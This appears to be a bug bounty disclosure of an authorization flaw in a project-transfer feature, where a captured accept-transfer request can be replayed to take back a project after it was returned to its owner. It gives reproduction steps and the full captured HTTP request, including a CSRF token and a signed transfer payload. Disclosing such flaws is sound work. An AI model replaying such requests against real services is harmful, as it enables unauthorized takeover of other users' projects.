# :game_die: $800 Improper Authorization Flaw: Unauthorized Project Reclaiming Post Transfer

---

## Steps to Reproduce

Initial Setup:

- Have two accounts: a victim account (Account A) and an attacker account (Account B)

Transfer Project to Attacker:

- As the victim (Account A), initiate a project transfer to the attacker (Account B).

- The attacker (Account B) accepts the project transfer and captures the `POST /api/0/accept-transfer/` request. Save this request for later use.

Transfer Project Back to Victim:

- After completing the work, the attacker (Account B) transfers the project back to the victim (Account A).

- The victim (Account A) accepts the project transfer, regaining control of the project.

Exploit the Vulnerability:

- The attacker (Account B) reuses the previously captured `POST /api/0/accept-transfer/` request to reclaim the project, despite the project being transferred back to the victim (Account A).

Captured Request Details:

```
POST /api/0/accept-transfer/ HTTP/2
Host: us.examentry.io
Cookie: __
Content-Length: 318
Sec-Ch-Ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Content-Type: application/json
Accept: application/json; charset=utf-8
Baggage: sentry-trace_id=50e48675f4334fe087afd7cc6fa40f54,sentry-environment=prod,sentry-release=backend%4005084e4c0a03486d5239f31986eb52cdfce5ec6b,sentry-public_key=16427b2f210046b585ee51fd8a1ac54f,sentry-transaction=%2Faccept-transfer%2F,sentry-sample_rate=1.0,sentry-sampled=true
X-Csrftoken: AlTfGEYHxGBIFKsZ6KmRACng6SyhWdK5
Sentry-Trace: 50e48675f4334fe087afd7cc6fa40f54-b72f3657d91b5768-1
Sec-Ch-Ua-Platform: "macOS"
Origin: https://fefe-00.examentry.io
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://fefe-00.examentry.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
Priority: u=1, i

{"data":"eyJhY3Rvcl9pZCI6Mjk3NDU3NSwiZnJvbV9vcmdhbml6YXRpb25faWQiOjQ1MDYyOTUzNjU2NjQ3NjgsInByb2plY3RfaWQiOjQ1MDcyNzYyNDA2ODMwMDgsInVzZXJfaWQiOjMyMjA0NDksInRyYW5zYWN0aW9uX2lkIjoiNjMzMzE5ZWE2NjNmNDdjYmI0MjY3ZGRmNjE4ZTBiZmIifToxczk2Tjk6MHBoMjFyUWVmbGxvVFZZSHc0RUdfQzdNUTBoLUpySnczWFFnZDNJM3lyYw","organization":"fefe-00"}
```

---
